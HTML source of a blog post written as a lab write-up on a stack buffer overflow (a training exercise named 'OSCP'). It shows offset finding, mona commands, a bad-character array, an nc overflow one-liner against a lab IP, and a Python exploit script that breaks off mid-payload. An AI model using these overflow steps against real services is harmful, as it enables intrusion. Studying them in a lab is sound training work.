+            <span class="post-title" title="Set shortcut with i3 for brightness.">Set shortcut with i3 for brightness.</span>
+            <span class="post-date" title="2021-07-31 20:23:52">2021/07/31</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Inferno.html"
+           data-tag="Pentest"
+           data-author="" >
+            <span class="post-title" title="CTF Inferno">CTF Inferno</span>
+            <span class="post-date" title="2021-07-19 18:59:52">2021/07/19</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Fix_picom_blur_not_working.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Fix the blur with picom">Fix the blur with picom</span>
+            <span class="post-date" title="2021-07-18 22:40:52">2021/07/18</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Configure_touchpad_on_i3.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Configure the touchpad [I3]">Configure the touchpad [I3]</span>
+            <span class="post-date" title="2021-07-16 02:16:52">2021/07/16</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/Send_file_via_ssh.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Send a file via ssh">Send a file via ssh</span>
+            <span class="post-date" title="2021-07-14 04:15:52">2021/07/14</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Install-nvidia-driver.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Install nvidia driver on Arch Linux">Install nvidia driver on Arch Linux</span>
+            <span class="post-date" title="2021-07-13 17:48:52">2021/07/13</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Restore-backup.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Restore a backup with timeshift">Restore a backup with timeshift</span>
+            <span class="post-date" title="2021-07-12 01:59:52">2021/07/12</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Repare-wine.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="wine: could not load kernel32.dll, status c0000135">wine: could not load kernel32.dll, status c0000135</span>
+            <span class="post-date" title="2021-07-11 18:50:52">2021/07/11</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Create_new_partition_linux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Add a partition in linux">Add a partition in linux</span>
+            <span class="post-date" title="2021-07-11 03:06:52">2021/07/11</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Save-Arch-linux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Get a shell when Arch Linux is broken">Get a shell when Arch Linux is broken</span>
+            <span class="post-date" title="2021-07-07 06:55:56">2021/07/07</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Install-AUR-packages.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Installing AUR packages">Installing AUR packages</span>
+            <span class="post-date" title="2021-07-04 13:45:52">2021/07/04</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_gigachad.html"
+           data-tag="Pentest"
+           data-author="" >
+            <span class="post-title" title="CTF-gigachad">CTF-gigachad</span>
+            <span class="post-date" title="2021-07-01 04:15:52">2021/07/01</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Install-ArchLinux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Arch Linux installation guide">Arch Linux installation guide</span>
+            <span class="post-date" title="2021-07-01 04:15:52">2021/07/01</span>
+        </a>
+        
+        <a  class="All Programing "
+           href="/post/Create-an-IRC-bot-with-python.html"
+           data-tag="IRC Python"
+           data-author="" >
+            <span class="post-title" title="Create an IRC bot with python">Create an IRC bot with python</span>
+            <span class="post-date" title="2021-06-21 21:25:10">2021/06/21</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/openVPN.html"
+           data-tag="VPN"
+           data-author="" >
+            <span class="post-title" title="OpenVPN">OpenVPN</span>
+            <span class="post-date" title="2021-06-20 17:53:11">2021/06/20</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/Relais-tor.html"
+           data-tag="Tor"
+           data-author="" >
+            <span class="post-title" title="Création d&#39;un relais tor avec debian 10">Création d&#39;un relais tor avec debian 10</span>
+            <span class="post-date" title="2021-04-09 13:45:52">2021/04/09</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/Secu-apache.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Securing an apache server">Securing an apache server</span>
+            <span class="post-date" title="2021-03-09 12:45:52">2021/03/09</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-Buffer Overflow Prep 2" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Buffer Overflow Prep 2</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Security">Security</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">Linux</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-02-26 11:34:18'>2023-02-26 17:10</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:1.9k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Finding-Bad-Characters"><span class="toc-text">Finding Bad Characters</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Find-the-jump-point"><span class="toc-text">Find the jump point</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gereate-the-payload"><span class="toc-text">Gereate the payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exploit"><span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>It’s the same thing as the prep 1, but I still writing it because it’s my notes.</p>
+<p><img src="https://i.imgur.com/WKeLvSO.png"><br>Crashing at 630, it’s useless to be presice like this.<br>If you enter only “A” chars you won’t see the offset in the EIP, he need a patern.<br><a href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/">https://wiremask.eu/tools/buffer-overflow-pattern-generator/</a></p>
+<p>So it’s crashing between 600 and 700, let’s create a string of 300*”A” + 400*”patern”.<br><img src="https://i.imgur.com/jQbM42C.png"><br><img src="https://i.imgur.com/we17ssi.png"><br>0x6c41316c offset 334</p>
+<p>Offset 334, that’s mean 300*”A” + 334*”patern”.<br>So now I can do 300+334=634, “A”*334 + “B”*4<br><img src="https://i.imgur.com/e89SZaM.png"><br>View &gt; log (alt +l)<br><img src="https://i.imgur.com/VtyuV2D.png"><br>42424242 is my BBBB. So I found the EIP</p>
+<h1 id="Finding-Bad-Characters"><a href="#Finding-Bad-Characters" class="headerlink" title="Finding Bad Characters"></a>Finding Bad Characters</h1><p>For mona:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona bytearray -b <span class="token string">"<span class="token entity" title="\x00">\x00</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>For me:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span>x01<span class="token punctuation">\</span>x02<span class="token punctuation">\</span>x03<span class="token punctuation">\</span>x04<span class="token punctuation">\</span>x05<span class="token punctuation">\</span>x06<span class="token punctuation">\</span>x07<span class="token punctuation">\</span>x08<span class="token punctuation">\</span>x09<span class="token punctuation">\</span>x0a<span class="token punctuation">\</span>x0b<span class="token punctuation">\</span>x0c<span class="token punctuation">\</span>x0d<span class="token punctuation">\</span>x0e<span class="token punctuation">\</span>x0f<span class="token punctuation">\</span>x10<span class="token punctuation">\</span>x11<span class="token punctuation">\</span>x12<span class="token punctuation">\</span>x13<span class="token punctuation">\</span>x14<span class="token punctuation">\</span>x15<span class="token punctuation">\</span>x16<span class="token punctuation">\</span>x17<span class="token punctuation">\</span>x18<span class="token punctuation">\</span>x19<span class="token punctuation">\</span>x1a<span class="token punctuation">\</span>x1b<span class="token punctuation">\</span>x1c<span class="token punctuation">\</span>x1d<span class="token punctuation">\</span>x1e<span class="token punctuation">\</span>x1f<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x21<span class="token punctuation">\</span>x22<span class="token punctuation">\</span>x23<span class="token punctuation">\</span>x24<span class="token punctuation">\</span>x25<span class="token punctuation">\</span>x26<span class="token punctuation">\</span>x27<span class="token punctuation">\</span>x28<span class="token punctuation">\</span>x29<span class="token punctuation">\</span>x2a<span class="token punctuation">\</span>x2b<span class="token punctuation">\</span>x2c<span class="token punctuation">\</span>x2d<span class="token punctuation">\</span>x2e<span class="token punctuation">\</span>x2f<span class="token punctuation">\</span>x30<span class="token punctuation">\</span>x31<span class="token punctuation">\</span>x32<span class="token punctuation">\</span>x33<span class="token punctuation">\</span>x34<span class="token punctuation">\</span>x35<span class="token punctuation">\</span>x36<span class="token punctuation">\</span>x37<span class="token punctuation">\</span>x38<span class="token punctuation">\</span>x39<span class="token punctuation">\</span>x3a<span class="token punctuation">\</span>x3b<span class="token punctuation">\</span>x3c<span class="token punctuation">\</span>x3d<span class="token punctuation">\</span>x3e<span class="token punctuation">\</span>x3f<span class="token punctuation">\</span>x40<span class="token punctuation">\</span>x41<span class="token punctuation">\</span>x42<span class="token punctuation">\</span>x43<span class="token punctuation">\</span>x44<span class="token punctuation">\</span>x45<span class="token punctuation">\</span>x46<span class="token punctuation">\</span>x47<span class="token punctuation">\</span>x48<span class="token punctuation">\</span>x49<span class="token punctuation">\</span>x4a<span class="token punctuation">\</span>x4b<span class="token punctuation">\</span>x4c<span class="token punctuation">\</span>x4d<span class="token punctuation">\</span>x4e<span class="token punctuation">\</span>x4f<span class="token punctuation">\</span>x50<span class="token punctuation">\</span>x51<span class="token punctuation">\</span>x52<span class="token punctuation">\</span>x53<span class="token punctuation">\</span>x54<span class="token punctuation">\</span>x55<span class="token punctuation">\</span>x56<span class="token punctuation">\</span>x57<span class="token punctuation">\</span>x58<span class="token punctuation">\</span>x59<span class="token punctuation">\</span>x5a<span class="token punctuation">\</span>x5b<span class="token punctuation">\</span>x5c<span class="token punctuation">\</span>x5d<span class="token punctuation">\</span>x5e<span class="token punctuation">\</span>x5f<span class="token punctuation">\</span>x60<span class="token punctuation">\</span>x61<span class="token punctuation">\</span>x62<span class="token punctuation">\</span>x63<span class="token punctuation">\</span>x64<span class="token punctuation">\</span>x65<span class="token punctuation">\</span>x66<span class="token punctuation">\</span>x67<span class="token punctuation">\</span>x68<span class="token punctuation">\</span>x69<span class="token punctuation">\</span>x6a<span class="token punctuation">\</span>x6b<span class="token punctuation">\</span>x6c<span class="token punctuation">\</span>x6d<span class="token punctuation">\</span>x6e<span class="token punctuation">\</span>x6f<span class="token punctuation">\</span>x70<span class="token punctuation">\</span>x71<span class="token punctuation">\</span>x72<span class="token punctuation">\</span>x73<span class="token punctuation">\</span>x74<span class="token punctuation">\</span>x75<span class="token punctuation">\</span>x76<span class="token punctuation">\</span>x77<span class="token punctuation">\</span>x78<span class="token punctuation">\</span>x79<span class="token punctuation">\</span>x7a<span class="token punctuation">\</span>x7b<span class="token punctuation">\</span>x7c<span class="token punctuation">\</span>x7d<span class="token punctuation">\</span>x7e<span class="token punctuation">\</span>x7f<span class="token punctuation">\</span>x80<span class="token punctuation">\</span>x81<span class="token punctuation">\</span>x82<span class="token punctuation">\</span>x83<span class="token punctuation">\</span>x84<span class="token punctuation">\</span>x85<span class="token punctuation">\</span>x86<span class="token punctuation">\</span>x87<span class="token punctuation">\</span>x88<span class="token punctuation">\</span>x89<span class="token punctuation">\</span>x8a<span class="token punctuation">\</span>x8b<span class="token punctuation">\</span>x8c<span class="token punctuation">\</span>x8d<span class="token punctuation">\</span>x8e<span class="token punctuation">\</span>x8f<span class="token punctuation">\</span>x90<span class="token punctuation">\</span>x91<span class="token punctuation">\</span>x92<span class="token punctuation">\</span>x93<span class="token punctuation">\</span>x94<span class="token punctuation">\</span>x95<span class="token punctuation">\</span>x96<span class="token punctuation">\</span>x97<span class="token punctuation">\</span>x98<span class="token punctuation">\</span>x99<span class="token punctuation">\</span>x9a<span class="token punctuation">\</span>x9b<span class="token punctuation">\</span>x9c<span class="token punctuation">\</span>x9d<span class="token punctuation">\</span>x9e<span class="token punctuation">\</span>x9f<span class="token punctuation">\</span>xa0<span class="token punctuation">\</span>xa1<span class="token punctuation">\</span>xa2<span class="token punctuation">\</span>xa3<span class="token punctuation">\</span>xa4<span class="token punctuation">\</span>xa5<span class="token punctuation">\</span>xa6<span class="token punctuation">\</span>xa7<span class="token punctuation">\</span>xa8<span class="token punctuation">\</span>xa9<span class="token punctuation">\</span>xaa<span class="token punctuation">\</span>xab<span class="token punctuation">\</span>xac<span class="token punctuation">\</span>xad<span class="token punctuation">\</span>xae<span class="token punctuation">\</span>xaf<span class="token punctuation">\</span>xb0<span class="token punctuation">\</span>xb1<span class="token punctuation">\</span>xb2<span class="token punctuation">\</span>xb3<span class="token punctuation">\</span>xb4<span class="token punctuation">\</span>xb5<span class="token punctuation">\</span>xb6<span class="token punctuation">\</span>xb7<span class="token punctuation">\</span>xb8<span class="token punctuation">\</span>xb9<span class="token punctuation">\</span>xba<span class="token punctuation">\</span>xbb<span class="token punctuation">\</span>xbc<span class="token punctuation">\</span>xbd<span class="token punctuation">\</span>xbe<span class="token punctuation">\</span>xbf<span class="token punctuation">\</span>xc0<span class="token punctuation">\</span>xc1<span class="token punctuation">\</span>xc2<span class="token punctuation">\</span>xc3<span class="token punctuation">\</span>xc4<span class="token punctuation">\</span>xc5<span class="token punctuation">\</span>xc6<span class="token punctuation">\</span>xc7<span class="token punctuation">\</span>xc8<span class="token punctuation">\</span>xc9<span class="token punctuation">\</span>xca<span class="token punctuation">\</span>xcb<span class="token punctuation">\</span>xcc<span class="token punctuation">\</span>xcd<span class="token punctuation">\</span>xce<span class="token punctuation">\</span>xcf<span class="token punctuation">\</span>xd0<span class="token punctuation">\</span>xd1<span class="token punctuation">\</span>xd2<span class="token punctuation">\</span>xd3<span class="token punctuation">\</span>xd4<span class="token punctuation">\</span>xd5<span class="token punctuation">\</span>xd6<span class="token punctuation">\</span>xd7<span class="token punctuation">\</span>xd8<span class="token punctuation">\</span>xd9<span class="token punctuation">\</span>xda<span class="token punctuation">\</span>xdb<span class="token punctuation">\</span>xdc<span class="token punctuation">\</span>xdd<span class="token punctuation">\</span>xde<span class="token punctuation">\</span>xdf<span class="token punctuation">\</span>xe0<span class="token punctuation">\</span>xe1<span class="token punctuation">\</span>xe2<span class="token punctuation">\</span>xe3<span class="token punctuation">\</span>xe4<span class="token punctuation">\</span>xe5<span class="token punctuation">\</span>xe6<span class="token punctuation">\</span>xe7<span class="token punctuation">\</span>xe8<span class="token punctuation">\</span>xe9<span class="token punctuation">\</span>xea<span class="token punctuation">\</span>xeb<span class="token punctuation">\</span>xec<span class="token punctuation">\</span>xed<span class="token punctuation">\</span>xee<span class="token punctuation">\</span>xef<span class="token punctuation">\</span>xf0<span class="token punctuation">\</span>xf1<span class="token punctuation">\</span>xf2<span class="token punctuation">\</span>xf3<span class="token punctuation">\</span>xf4<span class="token punctuation">\</span>xf5<span class="token punctuation">\</span>xf6<span class="token punctuation">\</span>xf7<span class="token punctuation">\</span>xf8<span class="token punctuation">\</span>xf9<span class="token punctuation">\</span>xfa<span class="token punctuation">\</span>xfb<span class="token punctuation">\</span>xfc<span class="token punctuation">\</span>xfd<span class="token punctuation">\</span>xfe<span class="token punctuation">\</span>xff<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Restart the program then:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token number">10.10</span>.35.232 <span class="token number">1337</span> <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"OVERFLOW2 "</span><span class="token variable"><span class="token variable">$(</span>python -c <span class="token string">'print( "A"*634 + "B"*4 + "<span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x05">\x05</span><span class="token entity" title="\x06">\x06</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\x0b">\x0b</span><span class="token entity" title="\x0c">\x0c</span><span class="token entity" title="\x0d">\x0d</span><span class="token entity" title="\x0e">\x0e</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x12">\x12</span><span class="token entity" title="\x13">\x13</span><span class="token entity" title="\x14">\x14</span><span class="token entity" title="\x15">\x15</span><span class="token entity" title="\x16">\x16</span><span class="token entity" title="\x17">\x17</span><span class="token entity" title="\x18">\x18</span><span class="token entity" title="\x19">\x19</span><span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\x1b">\x1b</span><span class="token entity" title="\x1c">\x1c</span><span class="token entity" title="\x1d">\x1d</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\x1f">\x1f</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\x22">\x22</span><span class="token entity" title="\x23">\x23</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\x26">\x26</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x28">\x28</span><span class="token entity" title="\x29">\x29</span><span class="token entity" title="\x2a">\x2a</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\x2c">\x2c</span><span class="token entity" title="\x2d">\x2d</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x30">\x30</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\x32">\x32</span><span class="token entity" title="\x33">\x33</span><span class="token entity" title="\x34">\x34</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\x36">\x36</span><span class="token entity" title="\x37">\x37</span><span class="token entity" title="\x38">\x38</span><span class="token entity" title="\x39">\x39</span><span class="token entity" title="\x3a">\x3a</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x3c">\x3c</span><span class="token entity" title="\x3d">\x3d</span><span class="token entity" title="\x3e">\x3e</span><span class="token entity" title="\x3f">\x3f</span><span class="token entity" title="\x40">\x40</span><span class="token entity" title="\x41">\x41</span><span class="token entity" title="\x42">\x42</span><span class="token entity" title="\x43">\x43</span><span class="token entity" title="\x44">\x44</span><span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x46">\x46</span><span class="token entity" title="\x47">\x47</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x49">\x49</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\x4b">\x4b</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\x4d">\x4d</span><span class="token entity" title="\x4e">\x4e</span><span class="token entity" title="\x4f">\x4f</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x53">\x53</span><span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x55">\x55</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x57">\x57</span><span class="token entity" title="\x58">\x58</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x5a">\x5a</span><span class="token entity" title="\x5b">\x5b</span><span class="token entity" title="\x5c">\x5c</span><span class="token entity" title="\x5d">\x5d</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x60">\x60</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x66">\x66</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6a">\x6a</span><span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\x6c">\x6c</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x72">\x72</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x75">\x75</span><span class="token entity" title="\x76">\x76</span><span class="token entity" title="\x77">\x77</span><span class="token entity" title="\x78">\x78</span><span class="token entity" title="\x79">\x79</span><span class="token entity" title="\x7a">\x7a</span><span class="token entity" title="\x7b">\x7b</span><span class="token entity" title="\x7c">\x7c</span><span class="token entity" title="\x7d">\x7d</span><span class="token entity" title="\x7e">\x7e</span><span class="token entity" title="\x7f">\x7f</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x81">\x81</span><span class="token entity" title="\x82">\x82</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\x84">\x84</span><span class="token entity" title="\x85">\x85</span><span class="token entity" title="\x86">\x86</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\x88">\x88</span><span class="token entity" title="\x89">\x89</span><span class="token entity" title="\x8a">\x8a</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\x8d">\x8d</span><span class="token entity" title="\x8e">\x8e</span><span class="token entity" title="\x8f">\x8f</span><span class="token entity" title="\x90">\x90</span><span class="token entity" title="\x91">\x91</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\x93">\x93</span><span class="token entity" title="\x94">\x94</span><span class="token entity" title="\x95">\x95</span><span class="token entity" title="\x96">\x96</span><span class="token entity" title="\x97">\x97</span><span class="token entity" title="\x98">\x98</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x9a">\x9a</span><span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\x9c">\x9c</span><span class="token entity" title="\x9d">\x9d</span><span class="token entity" title="\x9e">\x9e</span><span class="token entity" title="\x9f">\x9f</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\xa1">\xa1</span><span class="token entity" title="\xa2">\xa2</span><span class="token entity" title="\xa3">\xa3</span><span class="token entity" title="\xa4">\xa4</span><span class="token entity" title="\xa5">\xa5</span><span class="token entity" title="\xa6">\xa6</span><span class="token entity" title="\xa7">\xa7</span><span class="token entity" title="\xa8">\xa8</span><span class="token entity" title="\xa9">\xa9</span><span class="token entity" title="\xaa">\xaa</span><span class="token entity" title="\xab">\xab</span><span class="token entity" title="\xac">\xac</span><span class="token entity" title="\xad">\xad</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\xaf">\xaf</span><span class="token entity" title="\xb0">\xb0</span><span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\xb2">\xb2</span><span class="token entity" title="\xb3">\xb3</span><span class="token entity" title="\xb4">\xb4</span><span class="token entity" title="\xb5">\xb5</span><span class="token entity" title="\xb6">\xb6</span><span class="token entity" title="\xb7">\xb7</span><span class="token entity" title="\xb8">\xb8</span><span class="token entity" title="\xb9">\xb9</span><span class="token entity" title="\xba">\xba</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\xbd">\xbd</span><span class="token entity" title="\xbe">\xbe</span><span class="token entity" title="\xbf">\xbf</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\xc1">\xc1</span><span class="token entity" title="\xc2">\xc2</span><span class="token entity" title="\xc3">\xc3</span><span class="token entity" title="\xc4">\xc4</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\xc6">\xc6</span><span class="token entity" title="\xc7">\xc7</span><span class="token entity" title="\xc8">\xc8</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xca">\xca</span><span class="token entity" title="\xcb">\xcb</span><span class="token entity" title="\xcc">\xcc</span><span class="token entity" title="\xcd">\xcd</span><span class="token entity" title="\xce">\xce</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\xd0">\xd0</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\xd2">\xd2</span><span class="token entity" title="\xd3">\xd3</span><span class="token entity" title="\xd4">\xd4</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\xd6">\xd6</span><span class="token entity" title="\xd7">\xd7</span><span class="token entity" title="\xd8">\xd8</span><span class="token entity" title="\xd9">\xd9</span><span class="token entity" title="\xda">\xda</span><span class="token entity" title="\xdb">\xdb</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\xdf">\xdf</span><span class="token entity" title="\xe0">\xe0</span><span class="token entity" title="\xe1">\xe1</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\xe3">\xe3</span><span class="token entity" title="\xe4">\xe4</span><span class="token entity" title="\xe5">\xe5</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\xe7">\xe7</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\xea">\xea</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\xec">\xec</span><span class="token entity" title="\xed">\xed</span><span class="token entity" title="\xee">\xee</span><span class="token entity" title="\xef">\xef</span><span class="token entity" title="\xf0">\xf0</span><span class="token entity" title="\xf1">\xf1</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\xf4">\xf4</span><span class="token entity" title="\xf5">\xf5</span><span class="token entity" title="\xf6">\xf6</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\xf9">\xf9</span><span class="token entity" title="\xfa">\xfa</span><span class="token entity" title="\xfb">\xfb</span><span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\xfe">\xfe</span><span class="token entity" title="\xff">\xff</span>")'</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/HnkUmkq.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona compare -f C:<span class="token punctuation">\</span>mona<span class="token punctuation">\</span>oscp<span class="token punctuation">\</span>bytearray.bin -a esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://i.imgur.com/TLfqvUf.png"><br>I got it, it’s because i’m using bash and not python so maybe there is problem of encoding.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">import</span> socket
+
+<span class="token function">ip</span> <span class="token operator">=</span> <span class="token string">"10.10.35.232"</span>
+port <span class="token operator">=</span> <span class="token number">1337</span>
+
+prefix <span class="token operator">=</span> <span class="token string">"OVERFLOW2 "</span>
+offset <span class="token operator">=</span> <span class="token number">634</span>
+overflow <span class="token operator">=</span> <span class="token string">"A"</span> * offset
+retn <span class="token operator">=</span> <span class="token string">"BBBB"</span>
+padding <span class="token operator">=</span> <span class="token string">""</span>
+payload <span class="token operator">=</span> <span class="token string">"<span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x05">\x05</span><span class="token entity" title="\x06">\x06</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\x0b">\x0b</span><span class="token entity" title="\x0c">\x0c</span><span class="token entity" title="\x0d">\x0d</span><span class="token entity" title="\x0e">\x0e</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x12">\x12</span><span class="token entity" title="\x13">\x13</span><span class="token entity" title="\x14">\x14</span><span class="token entity" title="\x15">\x15</span><span class="token entity" title="\x16">\x16</span><span class="token entity" title="\x17">\x17</span><span class="token entity" title="\x18">\x18</span><span class="token entity" title="\x19">\x19</span><span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\x1b">\x1b</span><span class="token entity" title="\x1c">\x1c</span><span class="token entity" title="\x1d">\x1d</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\x1f">\x1f</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\x22">\x22</span><span class="token entity" title="\x23">\x23</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\x26">\x26</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x28">\x28</span><span class="token 